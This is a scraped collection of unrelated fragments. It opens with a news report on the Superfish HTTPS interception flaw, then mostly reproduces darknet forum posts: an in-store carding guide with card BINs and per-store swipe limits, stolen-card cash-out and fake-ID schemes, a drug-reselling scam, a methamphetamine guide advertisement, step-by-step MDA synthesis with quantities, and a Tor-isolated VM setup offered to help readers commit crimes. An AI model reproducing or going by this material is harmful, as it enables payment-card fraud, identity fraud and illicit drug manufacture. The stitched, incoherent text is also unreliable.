The critical threat is present on Lenovo PCs that have adware from a company called Superfish installed. As unsavory as many people find software that injects ads into Web pages, there's something much more nefarious about the Superfish package. It installs a self-signed root HTTPS certificate that can intercept encrypted traffic for every website a user visits. When a user visits an HTTPS site, the site certificate is signed and controlled by Superfish and falsely represents itself as the official website certificate. Even worse, the private encryption key accompanying the Superfish-signed Transport Layer Security certificate appears to be the same for every Lenovo machine. Attackers may be able to use the key to certify imposter HTTPS websites that masquerade as Bank of America, Google, or any other secure destination on the Internet. Under such a scenario, PCs that have the Superfish root certificate installed will fail to flag the sites as forgeriesâa failure that completely undermines the reason HTTPS protections exist in the first place. [Update: Rob Graham, CEO of security firm Errata Security, has cracked the cryptographic key encrypting the Superfish certificate. That means anyone can now use the private key to launch man-in-the-middle HTTPS attacks that won't be detected by machines that have the certificate installed. It took Graham just three hours to figure out that the password was ""komodia"" (minus the quotes). He told Ars the certificate works against Google even when an end-user is using Chrome. That confirms earlier statements that certificate pinning in the browser is not a defense against this attack (more about that below). Graham has a detailed explanation how he did it here.] The adware and its effect on Web encryption has been discussed since at least September in Lenovo customer forum threads such as those here and here. In the latter post, dated January 21, a user showed a root certificate titled Superfish was installed:Enlarge He then went on to show how the certificate tampered with the HTTPS connection to a banking website, behavior that allowed Superfish to collect all data unencrypted. Surprisingly, the behavior largely escaped the notice of security and privacy advocates, until now. On Wednesday evening, following several lengthy Twitter discussions about the overlooked behavior, security researcher Chris Palmer bought a Lenovo Yoga 2 Pro for $600 at a San Francisco Bay Area Best Buy store. He quickly confirmed that the model was pre-installed with the Superfish software and self-signed key. When Palmer visited https://www.bankofamerica.com/, he found that the certificate presented to his browser wasn't signed by certificate authority VeriSign as one would expect, but rather by Superfish.Chris Palmer He saw the same Superfish-signed certificate misrepresenting itself when he visited other HTTPS-protected websites. In fact, there isn't a single TLS-protected website that wasn't affected. Palmer was later able to confirm that the private key for the Superfish certificate installed on his Yoga 2 contained the same private key as a Superfish certificate installed on a different person's Lenovo PC. That means there's a good chance attackers could use the certificate to create fake HTTPS websites that wouldn't be detected by vulnerable Lenovo machines. At the time this report was being prepared, there were no reports of anyone testing and confirming the hypothesis, but several researchers agreed the scenario seemed highly likely.No, certificate pinning won't save you The Superfish software hijacks encrypted Web sessions no matter which browser someone uses. Worse yet, certificate pinning in Google Chrome will do nothing to alert users that something is amiss. As Google points out in a post explaining certificate pinning, the mechanism isn't set up to validate certificates chained to a private anchor, such as a root certificate installed in the operating system of the connecting device. ""A key result of this policy is that private trust anchors can be used to proxy (or MITM) connections, even to pinned sites,"" the Google page warned. ""'Data loss prevention' appliances, firewalls, content filters, and malware can use this feature to defeat the protections of key pinning."" Further ReadingLenovo honestly thought youâd enjoy that Superfish HTTPS spyware It wasn't about the money!It's not known exactly which Lenovo computers come with Superfish pre-installed. A Lenovo representative said in a forum that Superfish has been uninstalled and cited ""some issues (browser pop up behavior for example)"" as the reason. On Twitter Wednesday evening, a Lenovo representative reiterated that the adware was removed on new machines. But as Palmer's experience demonstrated, it's still possible to buy Lenovo PCs that have it pre-installed. And it remains unclear if there's an update mechanism in place to remove it from machines that already have it installed. It's also unknown if PCs from other manufacturers come with Superfish pre-installed. Readers should be aware that even after uninstalling the Superfish adware from their machines, the Superfish root certificate will remain. [Update: Lenovo has released a statement saying Superfish was installed on consumer laptops shipped between October and December 2014. The manufacturer said it stopped preloading Superfish in January 2015 and has no plans to resume the practice. Amazingly, the company said it did ""not find any evidence to substantiate security concerns,"" but added that it's responding to them anyway. People who are concerned their PC may contain this critical vulnerability can check at https://filippo.io/Badfish/. The website was designed by one of the same researchers who published a site to scan websites for the catastrophic Heartbleed weakness in OpenSSL. The company's claim that it didn't add Superfish until October is at odds with this post from June, in which a Lenovo user complains that the very same program was causing problems connecting to the Internet. Correction: The post is dated December. Ars regrets the error.] Superfish presumably installs the root certificates so it can inject ads into encrypted Web pages. By many people's standards, that's bad. But adware that breaks HTTPS connections and may make users vulnerable to man-in-the-middle attacks that are trivial to carry out is orders of magnitude worse. Stay tuned. We'll all be hearing much more about the Superfish debacle in the days and weeks ahead. [Update: Lenovo has released a list of models that may have had Superfish installed.

So for physical carding, I really want to just get my own msr so I can encode dumps and card in store at self check outs. In the mean time, I found someone on the market who will encode dumps to plastic and I may try that just to get some cash flow going. Also, is there like a maximum price I can do at in store check outs? Could I buy a TV, ipad, or other electronic from walmart and run it through the self check out? Also, some of these places offer cash back when you use a credit card, which would be a decent alternative to an atm. How much can you usually get in cash back? What are some big places that offer cash back? Hell, I know a chain gorcery store that offers up to $100 cash back. If I could just buy a small item and get $100 in cash thats already profit",""

It is NOT Virworx, not the chinese webside number 1 or 2, and NOT the russian webside,that i do not want to disclose yet. And not the scandinavian one,that is not working anymore. Each method has its limitations, but doing all 4 (or 5) parallel, you can cash out pretty much!!! All the 5 websites are in English! 1 one them require burner phone, 1 is doing adress verification throw a plain old letter to (drop) post box, and only by one you should upload the usual docs. 2 of them are really golden -  ""     Fraudster obtains stolen cc details    Fraudster buys macbook for someone using stolen card and receives bitcoins throw this website.    Victim becomes nothing and reports fraudulent transaction.    Credit card company performs a chargeback.    Fraudster has cashed out the credit card for bitcoins. The macbook seller or the victim is out of pocket. ""  and here the other one: ""It literally solves one of the hardest parts of CC theft beyond stealing the credentials: fencing the stolen goods. Normally criminals make what, 10-20% of their fraudulently purchased items at the local pawn shop? And then have to risk finding a safe drop location. This way they keep 93% of the goods value. With this both the drop location and the fencing of the goods themselves is solved. You literally have people ASKING the CC thief to ship them hot product.""

I only say so because most are unique, and easily identifiable by their creators. They also dont sell often, so tracing the purchase is easier, and completly anon purchases are more difficult.

They'll be banned shortly.;Good Morning Evolution vendors and buyers, my name is Helena. As some of you will already know I offer customer support here on Evolution. Firstly, I must apologize for the increased site downtime this week, and that there has been some strange goings on since it being back online. And of course the database rollback. There is a reason for this, many new features are being implemented on the site and will be revealed in due course. I will tell you that domestic rate options are one (choose to view in EUR & GBP as well as USD) and also a new exchange feature will be implemented next month. We have also added more admin accounts which will be better staffed to assist you.We are now also ready to offer a very unique opportunity to a lucky few. The chance to invest in the site. I must be very clear and say that this is investment only, you will not own or have a say in any part of the running or management of the site. This can all be verified with Verto's forum post here i25c62nvu4cgeqyz.onion/viewforum.php?id=3?viewpost=58395 Or message him here http://i25c62nvu4cgeqyz.onion/pms_send.php?uid=3. Please do not speak about this on the forums yet as we are anticipating a lot of media attention over this and would like to minimize the impact if possible.We are offering 250 investment shares of 0.1 percent of the income of the site (income excluding running costs & Evolution share, staff etc.) which currently stands at ~$200'000 per month or $2'400'000 annually. Shares will be priced at à¸¿0.1 for a 0.1% share, paid in btc. There is no limit on the amount of shares you can buy, and the amount we will be paying out equates to 25% of the sites income. There is no limit to the amount of shares any one person can buy. For a 0.1% investment you will earn $200 per month, for a 0.5% investment you will earn $1000 a month and so on. As the site grows so will your pay-out, investments can be withdrawn at any time and pay-outs will be paid at the next pay-out date up to that point. This is a very unique opportunity and a chance to be a part of history.Money invested is going to be used in the short-term to finance more servers and to cover more staff to be able to make the site run faster and better than ever before, with more staff to assist you and more features for you to make your buying/selling experience that much better. Investors will have a new area within the account section of the account, where they can see the amount they have invested, the next pay-out date, and the amount which will be updated hourly. You will also find options here to change pay-out schedule (weekly, monthly, annually), cancel investment & change view types.Pay-outs will by default be monthly into your Evolution account, the schedule can be changed and a wallet address can be specified for payments. If you decide to cancel your investment, it will be refunded immediately. Payment for your shares need to be paid to the address specified below, these are then tracked internally and after payment for 250 investments has been received the payment address will no longer be valid and payments will not be able to made into it. Payment address - 1E7MvdRjSvCCPNPhNwAqKVsYSwFj2Bpp9xIf you receive an invalid wallet address error, you are too late. Your new investors section will become active 8-10 hours after payment is received. You can speed up this process by messaging Evolution Financial here http://i25c62nvu4cgeqyz.onion/pms_send.php?uid=13 with your Transaction ID, User name & Amount of investment shares and total btc sent.Example Subject - Evolution Investment 277349296 - Helena - 12 x 0.1% = à¸¿1.2This is strictly first come, first served. As, said before there is no limit on how many one person can buy. Again, this is the chance to be a part of the site and a part of history.Current price is à¸¿0.1 BTC per 0.1% share. This will reward you with around $200 per month. This may well be subject to increase.Thank you and good luckHelena, Evolution Staff"

But lets start with this (most of these methods is tested in montreal) FIRSt THING IS FIRST ... i always say... FRESHNESS FRESHNESS FRESHNESS is most important before anything.. so make sure you don't wait with your dump and you start using asap 201 has scared lots of people away but not fear.  201 is just fine (other than getting around chip melfuction with employee) for you to get product.   I will cover most common stores here remember.. if you buy canada dumps and your dumps not working its probably because the base is FLAGGED... NOT blocked.  read up my other post on flagging... Just means to bring amount down .. if nthing approving for lets say $200 then i would just probably quit with base ($50 is absolute last flag amount) RULE NUMBER 1 when you get inside store ----- PICKING THE RIGHT TARGET.. most important thing is to pick the employee that will make your purchase go smooth (don't ever pick the most experienced person as they will know your card is fake and call the cops )... most places dont call cops... they just pretend they do (70 % wont call) Electronics is usually best to resell store 1 FUTURE SHOP / BEst buy this is same exact company... same pos .. same everything....  This store is quite easy to card with.  I always suggest going to futureshop because they are commisssion based and want your dump to work so they make money.   rule 1 inside store is ? thats right.. pick the right target...  (new kid .. the i dont give a fuck kid ) Best bins from my experience for this store isscotia bank 201 bins .. especially business bins453750 453828 453818 453825  these top ones good for (2k swipes)453810 453826 453802 453803  good for 1k to 1500540534 1500$471536 2k438802 2k450003 $500 max448421 1k These are the swipe amounts on FRESH BASE... i dont like to brag but my dumps if you use the DAY I SEND.. i mean SAME DAY.. usaully the base will be a good one and it will work these amounts  .. also.  there is more bins that work at this store but im mentioning the one's im more sure about DONT get scared by the ""INPUT YOUR CVV code""  its a dummy feature that doesnt actually work ------------ TARGET CANADA Most flagged store in the country and all amounts will be tough here.. 453750 is a great bin .. a bin that if fresh will work 2k x2 at fs or bb BUTat target this bin will be lucky to work for $100. NO IM NOT JOKING.. Target canada is easy because one of very few stores that has self check out and gcs dont die.. but i promise you that dumps is very tough to work here Solution:EU dumps work AMAZING here... if you have fresh source (if you buying for $40 for a finland NORDEA bank corp card then its not a fresh source.. i promise..  These are bins i pay 150$ myself sometimes and i grab lots and lots of volume.)  certain bins will work 10k and NO IM NOT joking you can card 10k of gift cards just standing at self checkout... make sure each transacation on eu is not over $500 per swipe.. if base is flag then you can bring amount down to $250 FLAG BASE --- CANADA FLAGGING IS 2k fresh... (certain stores... ) First flag  $990  second flag $475  3rd flag $200  (i said it before and ill say it again.. if base flagged you need to know how to do well with it... many people that buy from me would not conisder ussing after $200 flag and i think its reasonable... many dumps when flag will decline $201 but approve $200 x10 Canada has good bins too for target but very rare ones.. as respect to my customers that RAPE this store.. i can not share as maybe there is 10 bins left max USA is GREAT here... problem is ... you cant swipe more than $200 per swipe.. this is the secret... LOTS of carders getting rich buying $20-$50 usa pieces (yup sometimes very fresh usa CORP cost $50) .. i know guys that card 50k from 2k dump orders and doing $200 I can not release all bin's here but CORP --CORP PURCHASING--Purchasing--BIZ is your best chance of working here ... THESe same bins from usa will work 2k per swipe if you use int he usa though.. (if you from canada. .then you not flying so you can do few swipes in usa for 2k per trans..)    WALMART Not bad store... good bin here is their own bin.. .but will ask you for walmart points number so you need to be good with your words here.  Walmart is GREAT for amex.. usa amex.. canada amex.. EU amex.. Its a good store to get approval....Good canada amex that is fresh will hit 1kx 3373500 is best canada amex bin (BLACK CARD ) but there is many others.. usually when base is fresh... all dumps will work here $500 swipes no issues.. this store is tough to do chip trick ..wait till night shift and go after weak cashiers... young kid.. unexperienced employees... not looking like they in school to be a pollice officerEU is great here .. very very good if you have eu 101 THE BAY one of the best stores in canada... this store have very best approval algo in all of stores.  Shopping stores in general is good in canada (holt renfrew.. harry rosen..) almost any bin will work here... AMEX is amazing here... but pretty much any bin is good RBC best bin btw is 4515-- sequence and 451223.. they just seem to work best... scotia great here... even TD not bad here. (td is toughest bank in canada ... but great for apple store) again... know how to run flag bases... wont approve for 1k swipe but usually 500 will work 2 to 3x APPLE STORE Great store... approvals is not too tough here.  EU china works very good here (china merchant bank will work 8k if it is very fresh)... most canada corp bins work great here also Lots of USA numbers is also good here but no more than $500  at absolute most.  APPLE usa is very easy with very good approval rate.. i promise that if you have dump 471536 453828 540534 555000 ... it will work 500 - 1k in canada but will swipe 5k in usa 452071  452070 great great gins (btw only CA bins left with 101 ) this bina lso good for walmart ================ shoppers drug mart TD is great here... td biz will work for 5k swipes.. i know this sounds crazy how anyone can even do this but i promise to you... THEY CAN .. its very tough but its possible.. I read from other member that know peopl ethat regularaly do 3-5k per swipe there. rbc binsscotia great herealberta treasurembnacaptial one side note... dejardins is another great bank to use.. just like bridgewatet is GAS STATIONs every n00b carder will start with this... i will be honest. gas stations will be tough to get approval especially when you trying at the pump... just very tough.. if you go inside then you have much more luck.. promise you that.. but tough place. Petro canadaShell these 2 are probably best .. esso kills many dumps..also employees at gas stations are usually owners or relatives of owners so very much on their A game ... becasueful here. ========== Canada amex is great 3733**3732**3735**Anything entertainment... 10k will work.. shoping stores is great too.. keep it safe and keep doing $500 .. dump will work many transacation    LET ME know if there is other stores or other canada carding questions... most of this is from top of my head.  Currently no dumps available from me but when i post.. Canada will be very good if you know how to use.  Especially for usa customers.. canada dumps approve very very good in usa  Hope you enjoyed this entry in store carding article.. hope it was good read smile *DUMPS vendor----EU--CA--USA*FRESHNESS is key*In-store carding expert (ASK questions--Gain knowledge---Help others)",""

The farther you stray outwards, the higher chance of raising some flags. Having an RDP that is in the same state from a nearby large city shouldn't cause any problems; it's not unreasonable for a legitimate person to be in a nearby city for business or personal reasons. Keep it consistent with your connections and cookies and you should be alright despite not being in the exact location.","Darcyweed wrote:bongos wrote:Have a dedicated RDP specifically for accessing the account.

But a Galaxy S4 comes with 1080 x 1920, so nowadays you don't need that much lower resolution to spoof an Android. You can set custom resolution in Windows, perhaps if you did set 1080 * 1920 for the whole system that it would detect an Android resolution (and then you change user agent just like you said). It's worth a try. https www ehow.com/how_8446265_custom-screen-resolution-windows-7 html

Well to start I should say this is definitely legal, and its not actually related to stealing anything, nor is it SE (so don't worry its not one of those guides.... that require you to dress up like a woman, and stand under a street lamp ), its just a flaw in the system. I must say, anyone can do it, it does not require any expertise or skill. This method is brilliant and depending on your resources you could exploit this. I must say, you WILL make your money back, I mean the start-up is not very demand (can't go into too much detail), but yes, I suppose, as any guide it requires you do invest a little time and effort. However I am inclined to mention this guide is NOT for everyone, particularly lazy gits , but you can legally make hundreds a week with this method, as I am currently, making nearly Â£100. I must give a vouch to the Guide, as well as the Vendor! Najtek is a great vendor, finally someone from Poland, who can help us all exploit Polands flawed banking systems! Ozzyz",""

"Evolution Forums","nukefile","6984","2014-04-08T08:39:53","How fucked are we?","Security & Anonymity","https://blog.torproject.org/blog/openssl-bug-cve-2014-0160http://heartbleed.com/","A new OpenSSL vulnerability on 1.0.1 through 1.0.1f is out today, which can be used to reveal memory to a connected client or server.If you're using an older OpenSSL version, you're safe.Note that this bug affects way more programs than just Tor â expect everybody who runs an https webserver to be scrambling today. If you need strong anonymity or privacy on the Internet, you might want to stay away from the Internet entirely for the next few days while things settle.;How widespread is this?Most notable software using OpenSSL are the open source web servers like Apache and nginx. The combined market share of just those two out of the active sites on the Internet was over 66% according to Netcraft's April 2014 Web Server Survey. Furthermore OpenSSL is used to protect for example email servers (SMTP, POP and IMAP protocols), chat servers (XMPP protocol), virtual private networks (SSL VPNs), network appliances and wide variety of client side software. Fortunately many large consumer sites are saved by their conservative choice of SSL/TLS termination equipment and software. Ironically smaller and more progressive services or those who have upgraded to latest and best encryption will be affected most. Furthermore OpenSSL is very popular in client software and somewhat popular in networked appliances which have most inertia in getting updates.;Relays and bridges: Tor relays and bridges could maybe be made to leak their medium-term onion keys (rotated once a week), or their long-term relay identity keys. An attacker who has your relay identity key can publish a new relay descriptor indicating that you're at a new location (not a particularly useful attack). An attacker who has your relay identity key, has your onion key, and can intercept traffic flows to your IP address can impersonate your relay (but remember that Tor's multi-hop design means that attacking just one relay in the client's path is not very useful). In any case, best practice would be to update your OpenSSL package, discard all the files in keys/ in your DataDirectory, and restart your Tor to generate new keys.Hidden services: Tor hidden services might leak their long-term hidden service identity keys to their guard relays. Like the last big OpenSSL bug, this shouldn't allow an attacker to identify the location of the hidden service, but an attacker who knows the hidden service identity key can impersonate the hidden service. Best practice would be to move to a new hidden-service address at your convenience.Directory authorities: In addition to the keys listed in the ""relays and bridges"" section above, Tor directory authorities might leak their medium-term authority signing keys. Once you've updated your OpenSSL package, you should generate a new signing key. Long-term directory authority identity keys are offline so should not be affected (whew). More tricky is that clients have your relay identity key hard-coded, so please don't rotate that yet. We'll see how this unfolds and try to think of a good solution there."

Only problem is whether or not too use real or fake ID and by a real ID i DON'T mean my own. After reading through the terms and conditions I saw a few things that concerned me; ###### 29. Under the Money Laundering Regulations 2007 (as updated from time to time) and where applicable the London Local Authorities Act 2007, the Company may be required to  verify the identity of the Customer and any additional names associated with the Agreement. This may include checking against electronic and other databases (public or otherwise). 30iii. The Company will store the Customerâs information  and verification thereof  in accordance with relevant legislation after which it will be destroyed. The Act confers rights of access to certain information held by the Company for the prevention or detection of offences for fraud prevention purposes. The Company may share any information collected with the Police to assist with investigations and/or enquiries as well as other public or private sector agencies or representative bodies complying with legislation and in accordance with relevant statutory and regulatory obligations.  So I take it a fake id, with docs to prove address still wouldn't work if they couldn't match the name to an address on the database? Or would a non UK fake ID be better since there would be a reason for the name not appearing on the system? Or would it be a long shot to suggest looking at the electoral register to find a random name and address that you could use in conjunction with the fake ID? Surely they wouldn't have access to photos on this database. Or do you think im being overly paranoid and they might not even check at all?  Anyone who has an MBE drop care shed any light on this? Any thoughts greatly appreciated",""

From what I read, you need a moderate level of SE'ing and be able to respond intelligently to any apparent failures that may be present.

This method is just brilliant, a method which i think will never get saturated. I just red it through and didn't try it out if this would work, but I'm pretty sure this will work. 8bkh2nbv provides pictures and even what to tell them if they ask specific questions. I think anyone could handle to get a replacement with this guide, all you need is a bit of SE in case you get a question there is no answer in 8bkh2nbv guide, but i would say this is a noob-friendly guide.  Worth every little penny and you will get them back for sure. Thanks again 8bkh2nbv. Regards

The account setup has to be top notch - VPN/ Anonymity all taken into account. The dumbest thing you can do is access the account through a normal phone or a laptop.  You have to stick to speciality drugs like LSD/DMT/MeO etc, and cannot be reselling weed. Customers pay you in fiat currency because they are too lazy to buy bitcoins, or do not know how the system works. And they desperately need the drugs. Charge them a premium on the darknet prices. Funnel the money through a bank drop or an anonymous account/PayPal, just to make sure your tracks are covered. Now you have to make a few orders to have the business started, and can gain the customer's trust. Once they see reviews or comments in your Instagram stream, they will be more than willing to trust you with their money and your business is set for a take-off. When the orders start flowing in, you can pretty much direct these addresses straight to the vendors on the darknet, so that the customers get the product delivered without your intervention. You are a middleman, sitting on a pile of bitcoins and with the ability to pull off a big scam. Certainly not be as lucrative as in-storing or cashing out PP's, but when the street price of the drug is thrice the price found on the darknet, this method is guaranteed to pull in a decent coinday.",""

Current precursors such as pseudo/ephedrine/P2P are tightly controlled, hard to get, and expensive. http://k5zq47j6wd3wdvjq.onion/listing/59104 This method can be scaled up infinitely without specialized equipment. It can be done by 1 person so no need to involve other people in the operation. No chemistry knowledge or experience necessary. Step by step instructions are provided. Equipment needed:Paint mixerContainers: 5 gallons buckets or even 55 gallon drumsDistillation/reflux setupHeating plate Chemicals: $2000/kg reoccuring cost, common, available in bulk, and unwatched. Three steps: 1. Preparing the precursor. Can be scaled up infinitely, common chemicals and no heat involved. 5 hours to complete. Can be done in 55 gallon drums. Mostly waiting while it is automatically stirring. At this point you can proceed forward to meth or sell the precursor as is as you would with pseudo/ephedrine/p2p. Currently you can sell the precursor in the US/Europe for about $25,000/kg, or $100,000+/kilo in Australia/NZ. 2. Prepare the methylamine hcl and mercuric chloride, full writeup provided. 6 hours to complete. Must be done under a chemical fume hood. 3. Actual one pot reaction: 6.5 hours to complete. No hydrogenation or pressure vessels needed. Simple and easy. The final cost per kilo is less than $2,000 for the reoccuring chemicals. Turn around and sell the kilo of meth in the US for $50,000-$100,000. Or in Australia/New Zealand for 300,000-$700,000!",""

The cooled solution is then added in 200-300ml portions slowly into the pail over a period of 2-3 hours with constant stirring. The solution should turn to a frothy green color. Stir for 12 hours and a solid mass should form at the bottom of the bucket. [If it does not solidify, mix another 350g of hydroxylamine hcl with 500g water and add this to the reaction, then add another 1000ml methanol and stir for another 12 hours].http://xfq5l5p4g3eyrct7.onion/upload/38572fb5bc9e0ebe69f506ecff698f97.jpg Filter out the solid and wash it thoroughly with water and let it dry.http://xfq5l5p4g3eyrct7.onion/upload/6892ce57754bc1037d3468fea9cfa194.jpg OXIME --> AMIDE300g of the dried product is added to a 2000ml flask along with 900ml xylene and 6g nickel acetate.http://xfq5l5p4g3eyrct7.onion/upload/025ff23454e00b0006e37bc99bc088ff.jpg This mixture is heated to 130C for 6 hours.

Dry the recrystallized product and grind in into an extremely fine dust in a coffee grinder. It is very important that is a very fine dust with small particle size.http://xfq5l5p4g3eyrct7.onion/upload/43ed083b3712d2bcf267a8e837c0ddee.jpg AMIDE --> AMINEAdd 2000ml water and 1200ml bleach into a clean 4-liter plastic milk jug. Add 100g sodium hydroxide and shake it up well. Cool it in a fridge for several hours. Add 100g of the finely powdered product from the previous step to the milk jug. Shake this mixture up and place it in the fridge for 72 hours, shaking it every few hours [or as much as possible as often as possible]. Take it out of the fridge and let if sit at room temp for 24 hours, again shaking it up whenever you get the chance. Then place it in a hot water bath for 6-12 hours. It should be a milky orange color with tarry MDA base floating in it. Use a separatory funnel to extract the MDA base with xylene or toluene and discard the water layer. Next add diluted HCl acid until the pH of the water layer is 1 and discard the oil layer this time. Evaporate the acidified water layer in a pyrex baking tray.

DigitalDong, wow, I'm impressed by your google skills, hah! The only guide he had that I found questionable was the MDMA guide and therefore I'm not listing it. It required sassafras oil, something that was available from 2 sellers on SR 1.0 but is no longer available at present. Twodogs method is not practical, it uses hundreds of liters of solvents and weeks of time to get just 2lbs of the precursor. If you tried it, you would know. But you are just an armchair critic and fantasy meth cook. As mentioned earlier, this is a completely unpublished method. FYI, I have already sold 2 meth guides. I now have an even more interesting  synthesis but I'm only offering it to my best customers, real game/world changing method for the #1 drug in the world (no, not meth). You guessed it, pure pharmaceutical grade cocaine for less than $50/lb. I have 4 clients lined up to buy it in the mid 6 figures range. It's worth to mention that I have other unlisted synths including mescaline, 2CB, and ketamine all original, quick, and cheap with unwatched precursors.

So I took some existed ideas and make my own way to create an ultimate isolated environment to do anything without the worry about getting hacked back or becoming a victim of 0day attack etc. At first I thought to create a pdf of this guide and sell it on d marketplace but den I thought about newbies without sufficient money who'll not b able 2 buy this and those NSA guyz'll have their chances to take em down which will again make a new issue in d deepweb. So dat I'm releasing it 4 free. Note: I'm releasing this guide for free. So if u wanna modify it on ur own way u'r free to do so. I'll b  very happy if u gonna share ur experiment here wid us. But if u gonna use this guide 2 teach others I'm expecting a small credit then. Note: This is gonna b one of d lengthiest post. And I want 2 go through every fucking word of this post. Cause believe me man u need it. So it would b btr idea 2 get a cup of coffe n start reading. Similar Project: WHONIX -  is using same approach. But whonix isn't for every1 and I think u've realized it also. MISCONCEPTIONS ABOUT ANONYMITY:  There are some misconceptions about anonymity which I wanna clear. Vpn: I think u already know about vpn, if not search engine is ur friend then. Well most of d time noobs likes to use vpn 4 everything. Which is not a good idea at all cause each n every vpn provider keeps logs, no matter whatever they're promising on their fucking advertisements. Though some guyz suggests 2 use vpn for small crimes like carding as it's easy to setup. Yeah it happens cause most probably no one gonna chase ur tail for a 300 buck phone, but what about serious crimes  huh? Vpn is never a  good option for true anonymity unless u know the provider personally n who's very trusted. Http Proxy: U've search eng. if u don't know anything about it. Some guys thinks highly anonymous http proxies protect their identity n awa their activities. Which isn't d case at all. Like d Vpn anyone can become Http proxy provider with bad intentions like sniffing ur traffic(if not encrypted) etc. And it also stores logs. But some times u need this to tunnel ur tor traffic through it as tor traffic can be rejected wid custom FW n IDS rules. Socks Proxy: Same as Http proxy. U can't use it alone unless u know d provider personally. Tails n Tor Browser: There's a huge misconception about Tails. Some thinks they're totally protected while they're committing crimes by using tails. Tails can't protect u from 0days which can lead 2 identity leak. And on d other hand some guys starts using Tor browser as it comes by default with javascript enabled which can really lead 2 identity leak or other attacks. WHAT IS AN ISOLATED ENVIRONMENT: An isolated environment is d place where u can use any os of ur choice for ur purposes without getting worried about identity leak or any kind of malicious attack, even 0 days as it only accepts connection on single socks port of ur choice. Below I'm gonna discuss Pros and Cons about it. So pls read this section carefully. Pros: 1. Identity leaks are impossible. 2. 0days and bots are useless inside this env. as it refuses d connection. 3. Free to use any OS inside d VM, even Win Xp. 4. Free to enable Javascript as most of modern websites doesn't work without it. 5.Free to do anything like Hacking, Carding, even hosting a Botnet(if have resources) etc. Cons: 1. It can't protect host os if it's vulnerable. 2. It can't protect ur traffic on d exit node if it's not encrypted. 3. It can't protect u if NSA is sitting on d two nodes of d total three nodes(Still not happened and chances are once in billion as long as tor will have lot's of legit nodes). 4. Most importantly it can't protect u from ur stupidity. BUILDING AN ISOLATED ENVIRONMENT STEP WISE STEP: By clearing all of d above things I'm gonna show u how to exactly build ur own isolated environment. So let's begin. Things U'll Need:  1. Tor â Which wl run on ur host os.2. Linux as a Host os(U can use any windows user friendly disro like Ubuntu, Mint, Zorin etc.)3. VM of ur choice.4. Os for VM.5. Bridge-utils6. Dnsmasq7. Privoxy8. Truecrypt(for extra security, optional Though)9. Vidalia(optional) Note: In this guide I'm using Linux as host os. Windows is not supported. If u wanna experiment wid Mac. Just go ahead. But if u want a guide from me then lemme know I'll create one n sell it as vendor. Step 1(Download & Install):  First thing first just download a latest distro of ur choice & install it(u can use LTS). Then setup it as per ur need & make sure to update it wid âapt-get updateâ & if there's any upgrade just do so by âapt-get upgradeâ. Then install Tor by adding PPA from it's official site and wid âapt-get install torâ. After that install others by doing d same wid apt like VM(Orcale Virtual Box in this case), Bridge-utils etc. except Truecrypt(u need 2 download it manually from any archive as it's right now dropped). And make sure to start ur FW(in this case I'm gonna use UFW which is a front end of iptables n disables by default in ubuntu n I'm gonna enable it wid âservice ufw enableâ) Waring: If u'r downloading Truecrypt from any third party make sure 2 check it's check sum b4 using it. Step 2(Configuring Host): So now as we are done wid step one we gonna proceed to this step which is configuring everything on d host. So here we go -  Adding Bridge Interface: This interface will have no access to the outside world & we'll configure our VM wid this interface. The only way to connect 2 d outside world via Tor. So if d Tor will down VM won't b able to connect to internet. To create this interface add following lines to ur â/etc/network/interfacesâ. # Bridgeauto vnet0iface vnet0 inet staticaddress 195.16.0.1 # u can pick anything from 3 ip classes.Netmask 255.255.255.0bridge_ports nonebridge_maxwait 0bridge_fd 1 Starting d Interface: sudo ifup vnet0 Tor: Open up âetc/tor/torrcâ file in a text editor put the following line. SocksListenAddress 195.16.0.1:9953 # In this case I'm using 9953 as my socks listen port. #U can use anything as long as there's no conflict. This port will listen for Socks traffic on #our interface. Dnsmasq: Dnsmasq masks our dns and helps us to forward dns request through our interface. So let's configure it. Open up /etc/dnsmasq.conf and put d lines below. And restart it with âservice dnsmasq restartâ.  interface=vnet0dhcp-range=195.16.0.2, 195.16.0.254, 1h Accepting All Connection In Our Interface: Now we've to tell our FW(In this case UFW) to accept all connection in our newly interface. So now we gonna put âufw allow all in on vnet0 && ufw allow out on vnet0â. So our socks traffic can pass through it. Configure VM: Now we gonna configure our VM(in this Oracle Virtual Machine). So open up Oracle Virtual Machine & configure it as u usually do except Network Section. Here we gonna select Bridge adapter and Our newly created interface as Name. Now just install ur OS in Virtual machine(in this case Win XP). Step 3(Configuring Environment Inside VM): I guess We've Xp as our virtual OS. So right now We're gonna configure it to suite our needs. Let's begin. Now open Local adapter in ur network section of Xp box & configure it properly so that it can connect to our interface. Finally verify it by pinging. EX: Ip â 195.16.0.2        Netmask â 255.255.255.0        GW â 195.16.0.1        Primary Dns Server â 195.16.0.1 # all our dns queries will get resolves through this one.        Secondary DS â 4.2.2.2 Privoxy: I guess u already know about Privoxy if nt den u know d deal. So after installing privoxy open it up and configure it. Search for 9050 on d configuration file and un comment d line & replace 127.0.0.1:9050 wid ur ip and port(in this case 195.16.0.1:9953 where tor is waiting for connection). Now configure ur applications wid privoxy to connect to d internet. Step 4(Optional Settings for Host Environment): Though this section is optional but I still recommend to using things below. Truecrypt: So We got Truecrypt in our Host. Create a container and mount it. After mounting copy all ur sensitive files to it like Virtual disk file etc. den create a new folder & name it something like tor(which is gonna b our data directory for tor) den copy ur torrc file from location /etc/tor to /media/truecrypt1(in this case we mounted d container in slot 1). Now again open up torrc file from /media/truecrypt1/torrc and point ur DataDirectory to /media/truecrypt1/tor(Make sure to always mount this container in slot 1 otherwise tor won't work). Now u can start Tor with something like âtor -f /media/truecrypt1/torrc(which will tell tor to fetch torrc file from truecrypt container)â. Vidalia: Now I assume we gonna use Vidalia. So open up settings tab in it & put ur desired control port in it & hit ok. And put same control port in ur torrc file. Make sure to use hashed password for control port. SOME SECURITY RELATED NOTES: Make sure u'r always updated wid ur host environment. Make sure ur Virtual machine software isn't vulnerable. It's a good idea to block all unnessecary ports. Block root login via ssh. If possible den use a strong FW wid custom rules & IDS to block all malicious traffic to d host environment. Last but not least be smart don't do anything stupid on deepweb. CONCLUSION: With an isolated environment u'r free to do anything on deepweb. But as a reminder u still have to be careful with ur host OS. Using bridges in Tor is a good idea so make sure u'r using it. Oh I know I didn't discussed it in full details den it would be a huge giant post. But I think it's enough. If u've any questions feel free 2 ask & most importantly stay safe & keep committing crimes.

